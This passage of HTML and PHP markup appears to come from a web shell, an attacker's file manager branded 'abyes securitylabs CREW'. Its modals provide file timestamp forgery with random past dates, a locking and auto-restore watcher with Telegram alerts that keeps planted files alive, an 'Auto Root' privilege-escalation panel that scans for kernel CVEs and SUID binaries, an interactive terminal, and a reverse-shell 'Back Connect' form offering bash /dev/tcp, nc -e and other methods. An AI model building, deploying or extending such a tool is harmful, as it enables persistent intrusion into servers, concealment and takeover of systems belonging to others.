        <div class="modal-header" style="border-bottom-color:rgba(34,211,238,0.3);background:rgba(34,211,238,0.04);">
            <span class="modal-title" style="color:var(--cyan);display:flex;align-items:center;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(34,211,238,0.12);border-radius:6px;border:1px solid rgba(34,211,238,0.3);">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                </span>
                Touch &mdash; Edit Last Modified
            </span>
            <button class="modal-close" onclick="hideModal2('touchModal')"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:18px;">
            <!-- Target info -->
            <div style="display:flex;align-items:center;gap:8px;background:rgba(34,211,238,0.07);border:1px solid rgba(34,211,238,0.2);border-radius:7px;padding:9px 13px;margin-bottom:16px;word-break:break-all;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2" style="flex-shrink:0;"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                <span style="color:var(--cyan);font-family:'JetBrains Mono',monospace;font-size:11px;" id="touchModalName"></span>
            </div>
            <!-- Current mtime display -->
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:14px;">
                <span style="font-size:11px;color:var(--text-muted);">Current:</span>
                <span id="touchCurrentDate" style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);background:rgba(255,255,255,0.04);border:1px solid var(--border-soft);padding:3px 9px;border-radius:5px;"></span>
            </div>
            <!-- Datetime picker -->
            <div class="form-group" style="margin-bottom:14px;">
                <label class="form-label">New Date &amp; Time</label>
                <input type="datetime-local" id="touchNewDate" class="form-input" style="font-family:'JetBrains Mono',monospace;font-size:12.5px;color-scheme:dark;">
            </div>
            <!-- Quick presets -->
            <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px;">
                <button type="button" onclick="touchSetPreset('now')" style="padding:4px 10px;background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:5px;color:var(--green);font-size:10.5px;font-family:inherit;cursor:pointer;transition:background 0.15s;" onmouseover="this.style.background='rgba(34,197,94,0.2)'" onmouseout="this.style.background='rgba(34,197,94,0.1)'">Now</button>
                <button type="button" onclick="touchSetPreset('random')" style="padding:4px 10px;background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.3);border-radius:5px;color:var(--accent);font-size:10.5px;font-family:inherit;cursor:pointer;transition:background 0.15s;" onmouseover="this.style.background='rgba(99,102,241,0.2)'" onmouseout="this.style.background='rgba(99,102,241,0.1)'">Random (2023-2024)</button>
                <button type="button" onclick="touchSetPreset('yesterday')" style="padding:4px 10px;background:rgba(255,255,255,0.04);border:1px solid var(--border-soft);border-radius:5px;color:var(--text-muted);font-size:10.5px;font-family:inherit;cursor:pointer;transition:background 0.15s;" onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">Yesterday</button>
                <button type="button" onclick="touchSetPreset('week')" style="padding:4px 10px;background:rgba(255,255,255,0.04);border:1px solid var(--border-soft);border-radius:5px;color:var(--text-muted);font-size:10.5px;font-family:inherit;cursor:pointer;transition:background 0.15s;" onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">1 Week Ago</button>
                <button type="button" onclick="touchSetPreset('month')" style="padding:4px 10px;background:rgba(255,255,255,0.04);border:1px solid var(--border-soft);border-radius:5px;color:var(--text-muted);font-size:10.5px;font-family:inherit;cursor:pointer;transition:background 0.15s;" onmouseover="this.style.background='rgba(255,255,255,0.08)'" onmouseout="this.style.background='rgba(255,255,255,0.04)'">1 Month Ago</button>
            </div>
            <!-- Result message -->
            <div id="touchResult" style="display:none;margin-top:10px;font-size:11.5px;padding:7px 12px;border-radius:6px;"></div>
            <input type="hidden" id="touchFilePath">
        </div>
        <div class="modal-footer" style="justify-content:space-between;gap:10px;">
            <button class="btn btn-secondary" onclick="hideModal2('touchModal')">Cancel</button>
            <button class="btn" id="touchSaveBtn" style="background:var(--cyan);border-color:var(--cyan);color:#000;font-weight:700;padding:8px 20px;" onclick="doTouch()">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                Apply
            </button>
        </div>
    </div>
</div>

<!-- Mass Lock Modal -->
<div class="modal-overlay hidden" id="massLockModal">
    <div class="modal" style="max-width:480px;">
        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);">
            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                </span>
                <span id="massLockTitle">Mass Lock</span>
            </span>
            <button class="modal-close" onclick="hideModal2('massLockModal')"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:16px;">
            <!-- Target summary -->
            <div id="massLockSummary" style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.2);border-radius:6px;padding:8px 12px;margin-bottom:14px;font-size:11px;color:#f59e0b;"></div>
            <!-- Info cards -->
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;">
                <div style="background:rgba(245,158,11,0.07);border:1px solid rgba(245,158,11,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="display:block;margin:0 auto 4px;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    <div style="font-size:9px;color:#f59e0b;font-weight:600;">Pantau Otomatis</div>
                </div>
                <div style="background:rgba(74,222,128,0.07);border:1px solid rgba(74,222,128,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" style="display:block;margin:0 auto 4px;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>
                    <div style="font-size:9px;color:#4ade80;font-weight:600;">Auto Restore</div>
                </div>
                <div style="background:rgba(99,179,237,0.07);border:1px solid rgba(99,179,237,0.15);border-radius:6px;padding:8px;text-align:center;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#63b3ed" stroke-width="2" style="display:block;margin:0 auto 4px;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    <div style="font-size:9px;color:#63b3ed;font-weight:600;">CDN Backup</div>
                </div>
            </div>
            <!-- Permission picker -->
            <div class="form-group" style="margin-bottom:12px;">
                <label class="form-label" style="font-size:11px;color:var(--text-muted);">Permission yang dikunci (chmod)</label>
                <input type="text" id="massLockPerm" class="form-input" value="0444" style="font-family:monospace;letter-spacing:2px;font-size:14px;font-weight:600;" maxlength="5">
                <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
                    <button type="button" onclick="document.getElementById('massLockPerm').value='0444'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:5px;color:#f87171;font-size:10px;font-family:monospace;cursor:pointer;">0444 — read-only</button>
                    <button type="button" onclick="document.getElementById('massLockPerm').value='0644'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:5px;color:#f59e0b;font-size:10px;font-family:monospace;cursor:pointer;">0644 — rw-r--r--</button>
                    <button type="button" onclick="document.getElementById('massLockPerm').value='0755'" style="flex:1;min-width:100px;padding:5px 8px;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);border-radius:5px;color:#4ade80;font-size:10px;font-family:monospace;cursor:pointer;">0755 — rwxr-xr-x</button>
                </div>
            </div>
            <!-- Progress (shown while locking) -->
            <div id="massLockProgress" style="display:none;">
                <div style="height:4px;background:rgba(245,158,11,0.15);border-radius:2px;overflow:hidden;margin-bottom:8px;">
                    <div id="massLockBar" style="height:100%;background:#f59e0b;width:0%;transition:width 0.3s;border-radius:2px;"></div>
                </div>
                <div id="massLockProgressText" style="font-size:10px;color:var(--text-muted);text-align:center;"></div>
            </div>
            <!-- Result -->
            <div id="massLockResult" style="display:none;font-size:11px;padding:8px 10px;border-radius:5px;"></div>
        </div>
        <div class="modal-footer" id="massLockFooter" style="justify-content:space-between;gap:8px;">
            <button class="btn btn-secondary" onclick="hideModal2('massLockModal')" style="padding:7px 16px;">Batal</button>
            <button class="btn" id="massLockBtn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 20px;" onclick="doMassLock()">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Lock Semua
            </button>
        </div>
    </div>
</div>

<!-- Lock Manager Modal -->
<div class="modal-overlay hidden" id="lockManagerModal" style="z-index:1000;position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);overflow:auto;padding:20px;">
    <div class="modal" style="max-width:700px;width:100%;max-height:90vh;display:flex;flex-direction:column;background:var(--bg-card);border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);flex-shrink:0;">
            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                </span>
                Lock Manager
                <span id="lockMgrWatcherBadge" style="display:none;font-size:9px;font-weight:700;padding:2px 8px;border-radius:4px;background:rgba(74,222,128,0.15);border:1px solid rgba(74,222,128,0.4);color:#4ade80;animation:procPulse 2s infinite;">
                    WATCHER AKTIF
                </span>
            </span>
            <button class="modal-close" onclick="hideModal2('lockManagerModal');if(_lockMgrPollTimer){clearInterval(_lockMgrPollTimer);_lockMgrPollTimer=null;}"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding:14px;min-height:120px;max-height:calc(90vh - 180px);overflow-y:auto;flex:1;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
                <div style="display:flex;align-items:center;gap:6px;">
                    <span id="lockMgrDot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#6b7280;"></span>
                    <span id="lockMgrStats" style="color:var(--text-muted);font-size:11px;">Loading...</span>
                </div>
                <div style="display:flex;gap:6px;align-items:center;">
                    <button class="btn btn-sm" style="border-color:#63b3ed;color:#63b3ed;font-size:10px;padding:3px 8px;" onclick="loadLockedFiles()">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:2px;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>Refresh
                    </button>
                    <button class="btn btn-sm" style="border-color:#f59e0b;color:#f59e0b;font-size:10px;padding:3px 8px;" onclick="runTickNow()" title="Paksa restore file yang missing sekarang">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:2px;"><polygon points="5 3 19 12 5 21 5 3"/></svg>Restore Now
                    </button>
                    <button class="btn btn-sm" style="border-color:#f85149;color:#f85149;font-size:10px;padding:3px 8px;" onclick="doUnlockAll()">Unlock All</button>
                </div>
            </div>
            <!-- Telegram Settings Collapsible -->
            <div style="margin-bottom:12px;">
                <button onclick="toggleTgPanel()" style="width:100%;background:rgba(41,182,246,0.07);border:1px solid rgba(41,182,246,0.2);border-radius:7px;padding:8px 12px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;color:#29b6f6;">
                    <span style="display:flex;align-items:center;gap:7px;font-size:11px;font-weight:600;">
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#29b6f6" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
                        Notifikasi Telegram
                        <span id="tgStatusBadge" style="display:none;font-size:9px;font-weight:700;padding:1px 7px;border-radius:4px;"></span>
                    </span>
                    <svg id="tgPanelArrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#29b6f6" stroke-width="2" style="transition:transform 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>
                </button>
                <div id="tgSettingsPanel" style="display:none;background:rgba(41,182,246,0.04);border:1px solid rgba(41,182,246,0.15);border-top:none;border-radius:0 0 7px 7px;padding:12px;">
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
                        <div>
                            <label style="font-size:10px;color:var(--text-muted);display:block;margin-bottom:3px;">Bot Token</label>
                            <input type="password" id="tgBotToken" class="form-input" placeholder="1234567890:AAFxxx..." style="font-family:monospace;font-size:11px;padding:6px 8px;" autocomplete="off">
                        </div>
                        <div>
                            <label style="font-size:10px;color:var(--text-muted);display:block;margin-bottom:3px;">Chat ID / Username</label>
                            <input type="text" id="tgChatId" class="form-input" placeholder="-100xxxxxxxx atau @username" style="font-family:monospace;font-size:11px;padding:6px 8px;" autocomplete="off">
                        </div>
                    </div>
                    <div style="background:rgba(41,182,246,0.07);border:1px solid rgba(41,182,246,0.15);border-radius:5px;padding:7px 10px;font-size:10px;color:#29b6f6;margin-bottom:10px;line-height:1.5;">
                        Dapatkan token dari <a href="https://t.me/BotFather" target="_blank" style="color:#29b6f6;">@BotFather</a> lalu kirim pesan ke bot kamu agar chat_id aktif.
                        Notifikasi dikirim saat file hilang (alert), berhasil restore (sukses), atau gagal restore (error).
                    </div>
                    <div id="tgSaveStatus" style="display:none;margin-bottom:8px;font-size:10px;padding:5px 10px;border-radius:5px;"></div>
                    <div style="display:flex;gap:6px;justify-content:flex-end;">
                        <button onclick="saveTgSettings()" style="padding:5px 14px;background:#29b6f6;border:1px solid rgba(41,182,246,0.6);border-radius:5px;color:#000;font-size:11px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:4px;">
                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
                            Simpan &amp; Test
                        </button>
                    </div>
                </div>
            </div>

            <!-- Diagnostic bar — shown when shell watcher dead/disabled -->
            <div id="lockMgrDiag" style="display:none;margin-bottom:10px;padding:8px 10px;background:rgba(248,81,73,0.08);border:1px solid rgba(248,81,73,0.25);border-radius:5px;font-size:10px;color:#f87171;line-height:1.5;">
            </div>
            <div id="lockManagerLoading" style="text-align:center;color:var(--text-muted);font-size:11px;padding:30px;">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="animation:spin 1s linear infinite;display:block;margin:0 auto 8px;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
                Loading...
            </div>
            <table id="lockManagerTable" style="display:none;width:100%;border-collapse:collapse;font-size:11px;table-layout:fixed;">
                <thead style="position:sticky;top:0;background:rgba(245,158,11,0.1);z-index:10;box-shadow:0 2px 4px rgba(0,0,0,0.1);">
                <tr style="border-bottom:1px solid rgba(245,158,11,0.2);">
                    <th style="padding:7px 8px;text-align:left;color:#f59e0b;font-weight:600;word-break:break-word;">Path</th>
                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;width:50px;">Lock</th>
                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;width:50px;">Cur</th>
                    <th style="padding:7px 8px;text-align:center;color:#4ade80;font-weight:600;width:50px;">Backup</th>
                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;width:60px;">Status</th>
                    <th style="padding:7px 8px;text-align:center;color:#f85149;font-weight:600;width:50px;">Action</th>
                </tr>
                </thead>
                <tbody id="lockManagerBody"></tbody>
            </table>
            <p id="lockManagerEmpty" style="display:none;text-align:center;color:var(--text-muted);font-size:11px;padding:30px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="display:block;margin:0 auto 8px;opacity:0.3;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Tidak ada file yang dikunci.
            </p>
        </div>
    </div>
</div>

<!-- Bulk Compress Name Modal -->
<div class="modal-overlay hidden" id="zipNameModal">
    <div class="modal" style="max-width: 380px;">
        <div class="modal-header" style="border-bottom-color: rgba(249, 115, 22, 0.3);">
            <span class="modal-title" style="color: #f97316;">Compress to ZIP</span>
            <button class="modal-close" onclick="hideModal2('zipNameModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">ZIP Filename</label>
                <input type="text" id="zipFileName" class="form-input" value="archive.zip" placeholder="archive.zip">
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('zipNameModal')">Cancel</button>
            <button class="btn" style="background: #f97316; border-color: #f97316; color: #fff; font-weight: 600;" onclick="doCompressZip()">Compress</button>
        </div>
    </div>
</div>

<!-- Auto Root Modal -->
<div class="modal-overlay hidden" id="autoRootModal">
    <div class="modal" style="max-width: 680px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(245, 158, 11, 0.3);">
            <span class="modal-title" style="color: #f59e0b;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                Auto Root - Privilege Escalation
            </span>
            <button class="modal-close" onclick="hideModal2('autoRootModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px; overflow-y: auto; max-height: calc(90vh - 120px);">
            <!-- System Info Panel -->
            <div id="arSysInfo" style="background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 12px; margin-bottom: 14px;">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                    <span style="font-size:12px;font-weight:600;color:#f59e0b;">System Information</span>
                    <span id="arStatus" style="font-size:10px;color:var(--text-muted);">Click Scan to detect kernel</span>
                </div>
                <div id="arInfoGrid" style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:10px;">
                    <div><span style="color:var(--text-muted);">Kernel:</span> <span id="arKernel" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Arch:</span> <span id="arArch" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">User:</span> <span id="arUser" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">UID:</span> <span id="arUid" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">GCC:</span> <span id="arGcc" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Writable:</span> <span id="arWritable" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Sudo:</span> <span id="arSudo" style="color:#00d4ff;">-</span></div>
                    <div><span style="color:var(--text-muted);">Docker:</span> <span id="arDocker" style="color:#00d4ff;">-</span></div>
                </div>
                <div style="margin-top:8px;"><span style="color:var(--text-muted);font-size:10px;">OS:</span> <span id="arOs" style="color:var(--text-secondary);font-size:10px;font-family:monospace;">-</span></div>
            </div>

            <!-- Scan Button -->
            <div style="text-align:center;margin-bottom:14px;">
                <button class="btn" id="arScanBtn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:700;padding:8px 28px;" onclick="doAutoRootScan()">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                    Scan Kernel & Detect CVE
                </button>
            </div>

            <!-- CVE Results -->
            <div id="arExploitList" style="display:none;">
                <div style="font-size:12px;font-weight:600;color:#f59e0b;margin-bottom:8px;">
                    Detected Exploits <span id="arExploitCount" style="background:rgba(245,158,11,0.15);color:#f59e0b;padding:2px 8px;border-radius:10px;font-size:10px;margin-left:6px;">0</span>
                </div>
                <div id="arExploits" style="display:flex;flex-direction:column;gap:8px;"></div>
            </div>

            <!-- SUID Results -->
            <div id="arSuidList" style="display:none;margin-top:14px;">
                <div style="font-size:12px;font-weight:600;color:#a78bfa;margin-bottom:8px;">
                    SUID Binaries (exploitable) <span id="arSuidCount" style="background:rgba(167,139,250,0.15);color:#a78bfa;padding:2px 8px;border-radius:10px;font-size:10px;margin-left:6px;">0</span>
                </div>
                <div id="arSuids" style="display:flex;flex-wrap:wrap;gap:6px;"></div>
            </div>

            <!-- Custom Exploit -->
            <div style="margin-top:14px;padding-top:14px;border-top:1px solid var(--border);">
                <div style="font-size:11px;font-weight:600;color:var(--text-secondary);margin-bottom:8px;">Custom Exploit Command</div>
                <div style="display:flex;gap:8px;">
                    <input type="text" id="arCustomCmd" class="form-input" placeholder="e.g. /tmp/exploit or custom command..." style="flex:1;font-family:monospace;font-size:11px;">
                    <button class="btn btn-sm" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:600;white-space:nowrap;" onclick="doAutoRootCustom()">Run</button>
                </div>
            </div>

            <!-- Execution Log -->
            <div id="arLogPanel" style="display:none;margin-top:14px;">
                <div style="font-size:11px;font-weight:600;color:var(--text-secondary);margin-bottom:6px;">Execution Log</div>
                <pre id="arLog" style="background:#0a0a0a;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:10px;color:#e0e0e0;max-height:250px;overflow-y:auto;white-space:pre-wrap;line-height:1.5;"></pre>
                <div id="arRootBanner" style="display:none;background:rgba(63,185,80,0.12);border:2px solid #3fb950;border-radius:8px;padding:14px;text-align:center;margin-top:10px;">
                    <div style="font-size:18px;font-weight:800;color:#3fb950;">ROOT ACCESS OBTAINED</div>
                    <div style="font-size:11px;color:var(--text-muted);margin-top:4px;" id="arRootInfo"></div>
                </div>
                <div id="arFailBanner" style="display:none;background:rgba(248,81,73,0.08);border:1px solid rgba(248,81,73,0.3);border-radius:6px;padding:10px;text-align:center;margin-top:10px;">
                    <div style="font-size:12px;font-weight:600;color:#f85149;">Exploit did not gain root</div>
                    <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Try another CVE or use a custom command</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Terminal Modal -->
<div class="modal-overlay hidden" id="terminalModal" style="z-index:1001;position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);padding:16px;">
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:10px;width:100%;max-width:900px;height:80vh;display:flex;flex-direction:column;box-shadow:0 24px 64px rgba(0,0,0,0.5);">
        <div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #21262d;flex-shrink:0;">
            <span style="display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;color:#e6edf3;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#58a6ff" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                abyes securitylabs CREW
                <span id="termStatusBadge" style="font-size:9px;padding:2px 7px;border-radius:4px;background:rgba(74,222,128,0.12);color:#4ade80;border:1px solid rgba(74,222,128,0.3);font-weight:700;">READY</span>
            </span>
            <div style="display:flex;gap:8px;align-items:center;">
                <button onclick="termClear()" style="background:none;border:1px solid #30363d;color:#8b949e;font-size:11px;padding:3px 10px;border-radius:5px;cursor:pointer;" title="Clear">Clear</button>
                <button onclick="hideModal2('terminalModal')" style="background:none;border:none;color:#8b949e;cursor:pointer;padding:4px;line-height:0;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                </button>
            </div>
        </div>
        <div style="flex:1;overflow:hidden;position:relative;">
            <textarea id="lpTerminal"
                style="width:100%;height:100%;background:#0d1117;color:#e6edf3;border:none;outline:none;resize:none;font-family:'Monaco','Menlo','Ubuntu Mono','Consolas',monospace;font-size:13px;line-height:1.5;padding:12px;box-sizing:border-box;overflow-y:auto;white-space:pre;"
                wrap="soft"
                autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                ondragstart="return false;"
            ></textarea>
        </div>
        <div style="padding:6px 14px;border-top:1px solid #21262d;font-size:10px;color:#484f58;flex-shrink:0;">
            <span id="" style="color:#58a6ff;font-family:monospace;"></span>
            &nbsp;&mdash;&nbsp;Ctrl+C abort &bull; Ctrl+L clear &bull; Up/Down history &bull; Tab complete
        </div>
    </div>
</div>
<!-- Backconnect Modal -->
<div class="modal-overlay hidden" id="backconnectModal">
    <div class="modal" style="max-width: 520px;">
        <div class="modal-header" style="border-bottom-color: rgba(239, 68, 68, 0.3);">
            <span class="modal-title" style="color: #ef4444;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                Back Connect
            </span>
            <button class="modal-close" onclick="hideModal2('backconnectModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.2); border-radius: 6px; padding: 10px; margin-bottom: 14px;">
                <p style="color: #ef4444; font-size: 11px; font-weight: 600; margin-bottom: 4px;">Reverse Shell Connection</p>
                <p style="color: var(--text-muted); font-size: 10px;">Start a listener first: <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:3px;color:#00d4ff;">nc -lvnp [PORT]</code></p>
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;">
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label">Host / IP</label>
                    <input type="text" id="bcHost" class="form-input" placeholder="e.g. 192.168.1.100">
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label">Port</label>
                    <input type="number" id="bcPort" class="form-input" placeholder="e.g. 4444" min="1" max="65535">
                </div>
            </div>
            <div class="form-group" style="margin-bottom: 12px;">
                <label class="form-label">Method</label>
                <select id="bcType" class="form-input" onchange="updateBcPreview()">
                    <option value="php">PHP (fsockopen + proc_open)</option>
                    <option value="perl">Perl (Socket)</option>
                    <option value="python">Python3 (subprocess)</option>
                    <option value="nc">Netcat (nc -e)</option>
                    <option value="bash">Bash (/dev/tcp)</option>
                    <option value="ruby">Ruby (TCPSocket)</option>
                </select>
            </div>
            <div style="margin-bottom: 10px;">
                <label class="form-label">Command Preview</label>
                <div id="bcPreview" style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-family: monospace; font-size: 10px; color: #00d4ff; word-break: break-all; max-height: 80px; overflow-y: auto; line-height: 1.4;"></div>
            </div>
            <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px;">
                <span style="font-size: 10px; color: var(--text-muted);">Available exec:</span>
                <?php
                $disabled_fns = array_map('trim', explode(',', ini_get('disable_functions')));
                $exec_fns = ['exec','shell_exec','system','passthru','popen','proc_open','fsockopen'];
